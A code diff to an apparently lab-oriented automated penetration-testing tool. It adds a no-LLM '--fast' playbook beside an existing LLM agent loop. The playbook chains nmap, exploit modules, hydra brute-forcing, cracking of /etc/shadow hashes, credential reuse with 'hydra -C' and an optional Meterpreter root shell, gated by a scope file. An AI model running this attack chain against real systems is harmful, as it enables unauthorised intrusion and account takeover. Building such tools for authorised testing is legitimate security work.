@@ -17,9 +17,10 @@ import requests
 
 from nmap_tool import run_nmap
 from enum_tool import run_enum
-from hydra_tool import run_hydra
+from hydra_tool import run_hydra, run_hydra_combo
 from exploit_tool import MODULES
 from postexploit_tool import run_postexploit, parse_collection, POST_COMMANDS, interactive_exploit
+from crack_tool import crack_hashes
 
 
 # Registry of simple recon/collection tools. Each runs as
@@ -216,16 +217,17 @@ def ask_llm(host, model, messages, think=True):
     return {"action": "error", "thought": error}
 
 
-def preflight(host, scope_file):
+def preflight(host, scope_file, need_llm=True):
     problems = []
     if shutil.which("nmap") is None:
         problems.append("nmap is not installed or not on PATH.")
     if not os.path.exists(scope_file):
         problems.append(f"scope file not found: {scope_file} (copy scope.txt.example to scope.txt).")
-    try:
-        requests.get(f"{host}/api/tags", timeout=5).raise_for_status()
-    except requests.exceptions.RequestException:
-        problems.append(f"cannot reach the Ollama server at {host} (is it running?).")
+    if need_llm:
+        try:
+            requests.get(f"{host}/api/tags", timeout=5).raise_for_status()
+        except requests.exceptions.RequestException:
+            problems.append(f"cannot reach the Ollama server at {host} (is it running?).")
     return problems
 
 
@@ -269,6 +271,35 @@ def extract_credentials(output):
         if m:
             creds.append(f"{m.group(2)} {m.group(3)} / {m.group(4)}")
     return creds
+
+
+def extract_credential_pairs(output):
+    """Structured version of extract_credentials: returns a list of
+    {"service", "user", "password"} dicts parsed from hydra output. Deduplicated
+    by (user, password) so the same login found on two services is stored once.
+    This is the data the credential-reuse step will later replay with hydra -C."""
+    pairs = []
+    seen = set()
+    for line in output.splitlines():
+        m = re.search(r"\[(\d+)\]\[(\w+)\].*login:\s*(\S+)\s+password:\s*(\S+)", line)
+        if m:
+            service, user, password = m.group(2), m.group(3), m.group(4)
+            key = (user, password)
+            if key not in seen:
+                seen.add(key)
+                pairs.append({"service": service, "user": user, "password": password})
+    return pairs
+
+
+def add_cred_pair(cred_pairs, service, user, password):
+    """Append a credential to cred_pairs, deduplicated by (user, password) across
+    ALL sources. Keeps the first source where the pair was seen. Returns True if
+    it was newly added, False if that login/password was already known."""
+    for existing in cred_pairs:
+        if existing["user"] == user and existing["password"] == password:
+            return False
+    cred_pairs.append({"service": service, "user": user, "password": password})
+    return True
 
 
 def describe_action(action, target):
@@ -342,6 +373,7 @@ def run_mission(host, model, scope_file, target, max_steps, exploit_enabled, int
     stuck = 0
     auto_approve = False
     credentials = []
+    cred_pairs = []
 
     for step in range(1, max_steps + 1):
         if stuck >= STUCK_LIMIT:
@@ -391,6 +423,9 @@ def run_mission(host, model, scope_file, target, max_steps, exploit_enabled, int
                         print("    [+] credentials found:")
                         for c in found:
                             print(f"        {c}")
+                    for pair in extract_credential_pairs(output):
+                        if pair not in cred_pairs:
+                            cred_pairs.append(pair)
             else:
                 stuck += 1
         elif kind == "exploit":
@@ -492,6 +527,166 @@ def run_mission(host, model, scope_file, target, max_steps, exploit_enabled, int
     print("\n[!] max steps reached without a final report", file=sys.stderr)
 
 
+# --- Deterministic playbook (--fast mode, no LLM) -------------------------
+# Built ALONGSIDE the LLM loop above; it does not touch run_mission.
+
+# Map the nmap service name (as printed in a scan line) to the hydra service
+# module the playbook attacks. nmap says 'postgresql'; hydra wants 'postgres'.
+AUTH_SERVICES = {
+    "ftp": "ftp",
+    "ssh": "ssh",
+    "telnet": "telnet",
+    "postgresql": "postgres",
+    "mysql": "mysql",
+}
+
+
+def auth_services_open(services):
+    """From parsed nmap lines ('5432/tcp open postgresql PostgreSQL ...'), return
+    the hydra service names of open auth services, in a stable order, no
+    duplicates. Translates nmap names to hydra names via AUTH_SERVICES."""
+    found = []
+    for line in services:
+        parts = line.split()
+        if len(parts) >= 3 and parts[1] == "open":
+            hydra_name = AUTH_SERVICES.get(parts[2].lower())
+            if hydra_name and hydra_name not in found:
+                found.append(hydra_name)
+    return found
+
+
+def decide_next(state):
+    """The playbook: given the current state, return the next action dict (same
+    shape the LLM emits). Pure function — no side effects, no network, no LLM.
+    Order: nmap -> exploit a matching module -> hydra on auth services ->
+    reuse found credentials -> finish."""
+    target = state["target"]
+
+    if state["scan"] is None:
+        return {"action": "nmap", "target": target}
+
+    services = state["services"]
+
+    # Exploit only while we have no shell yet: once root is obtained we stop
+    # launching modules (this also avoids back-to-back exploits the VM dislikes).
+    if state["exploit_enabled"] and not state["shell_opened"]:
+        blob = "\n".join(services).lower()
+        for key, meta in MODULES.items():
+            if meta["trigger"].lower() in blob and key not in state["exploited"]:
+                return {"action": "exploit", "module": key, "target": target}
+
+    for svc in auth_services_open(services):
+        if svc not in state["hydra_done"]:
+            return {"action": "hydra", "service": svc, "target": target}
+
+    if state["cred_pairs"]:
+        for svc in auth_services_open(services):
+            if svc not in state["reuse_done"]:
+                return {"action": "reuse", "service": svc, "target": target}
+
+    return {"action": "finish", "target": target}
+
+
+def run_fast(scope_file, target, max_steps, exploit_enabled, interactive, shell_enabled):
+    """Deterministic playbook loop: no LLM, no Ollama. Mirrors run_mission's
+    execution but the next action comes from decide_next() instead of the model."""
+    print(f"[*] target {target} | FAST playbook (no LLM)"
+          + (" | exploit ON" if exploit_enabled else "")
+          + ("" if interactive else " | non-interactive"))
+    state = {
+        "target": target,
+        "scan": None,
+        "services": [],
+        "exploit_enabled": exploit_enabled,
+        "exploited": set(),
+        "hydra_done": set(),
+        "reuse_done": set(),
+        "cred_pairs": [],
+        "shell_opened": False,
+    }
+    exploits = []
+    postexploit = {}
+
+    for step in range(1, max_steps + 1):
+        action = decide_next(state)
+        kind = action["action"]
+        print(f"\n[{step}] playbook -> {describe_action(action, target)}")
+
+        if kind == "nmap":
+            output = run_nmap(target, scope_file)
+            if output is None:
+                print("    [!] nmap refused: target not in scope. Stopping.", file=sys.stderr)
+                return
+            state["scan"] = output
+            state["services"] = parse_services(output)
+            print(f"    > {len(state['services'])} open service(s) found")
+
+        elif kind == "exploit":
+            module_key = action["module"]
+            print(f"    > exploit {module_key} on {target}")
+            output = run_postexploit(target, module_key, scope_file)
+            state["exploited"].add(module_key)
+            if output is None:
+                print("    [!] exploit refused (scope) or unknown module")
+                continue
+            outcome = exploit_result(output)
+            exploits.append(f"{module_key} on {target} -> {outcome}")
+            if outcome != "no session":
+                state["shell_opened"] = True
+                collected = parse_collection(output)
+                postexploit.update(collected)
+                print(f"    [+] {outcome}")
+                cracked = crack_hashes(collected.get("accounts", ""),
+                                       collected.get("password_hashes", ""))
+                if cracked:
+                    print(f"    [+] cracked {len(cracked)} password(s) from /etc/shadow:")
+                    for pair in cracked:
+                        add_cred_pair(state["cred_pairs"], "shadow",
+                                      pair["user"], pair["password"])
+                        print(f"        {pair['user']} / {pair['password']}")
+                if shell_enabled and interactive:
+                    print("    > opening interactive Meterpreter shell on the target...")
+                    interactive_exploit(target, module_key, scope_file)
+            else:
+                print("    [-] no session")
+
+        elif kind == "hydra":
+            svc = action["service"]
+            print(f"    > hydra {svc} on {target}")
+            output = run_hydra(target, svc, scope_file)
+            state["hydra_done"].add(svc)
+            if output:
+                for pair in extract_credential_pairs(output):
+                    add_cred_pair(state["cred_pairs"], pair["service"],
+                                  pair["user"], pair["password"])
+                if state["cred_pairs"]:
+                    print("    [+] credentials known so far:")
+                    for p in state["cred_pairs"]:
+                        print(f"        {p['user']} / {p['password']}  (found on {p['service']})")
+
+        elif kind == "reuse":
+            svc = action["service"]
+            print(f"    > reuse {len(state['cred_pairs'])} credential(s) on {svc} via hydra -C")
+            output = run_hydra_combo(target, svc, state["cred_pairs"], scope_file)
+            state["reuse_done"].add(svc)
+            if output:
+                for pair in extract_credential_pairs(output):
+                    # A reuse "hit" confirms a known login also opens this service.
+                    print(f"    [+] reuse worked on {svc}: {pair['user']} / {pair['password']}")
+
+        elif kind == "finish":
+            services = parse_services(state["scan"]) if state["scan"] else []
+            findings = "Deterministic playbook run (--fast, no LLM)."
+            credentials = [f"{p['service']} {p['user']} / {p['password']}"
+                           for p in state["cred_pairs"]]
+            report = build_report(target, services, exploits, postexploit, findings, credentials)
+            print("\n" + report)
+            print(f"[*] report saved to {save_report(target, report)}")
+            return
+
+    print("\n[!] max steps reached without finishing", file=sys.stderr)
+
+
 def save_report(target, report, directory="reports"):
     os.makedirs(directory, exist_ok=True)
     path = os.path.join(directory, f"{target}_{datetime.now():%Y-%m-%d_%H%M%S}.md")
@@ -522,9 +717,11 @@ def main():
                         help="after a successful exploit, hand an interactive root shell to the human (interactive only)")
     parser.add_argument("--guided", action="store_true",
                         help="validate or redirect each action before it runs (interactive only)")
+    parser.add_argument("--fast", action="store_true",
+                        help="run the deterministic playbook only (no LLM, no Ollama needed)")
     args = parser.parse_args()
 
-    problems = preflight(args.host, args.scope)
+    problems = preflight(args.host, args.scope, need_llm=not args.fast)
     if problems:
         for p in problems:
             print(f"[!] {p}", file=sys.stderr)
@@ -532,7 +729,10 @@ def main():
 
     interactive = sys.stdin.isatty() and not args.yes
     start = time.monotonic()
-    run_mission(args.host, args.model, args.scope, args.target, args.max_steps, args.exploit, interactive, args.think, args.shell, args.guided)
+    if args.fast:
+        run_fast(args.scope, args.target, args.max_steps, args.exploit, interactive, args.shell)
+    else:
+        run_mission(args.host, args.model, args.scope, args.target, args.max_steps, args.exploit, interactive, args.think, args.shell, args.guided)
     print(f"[*] total time: {time.monotonic() - start:.1f}s")
 
 
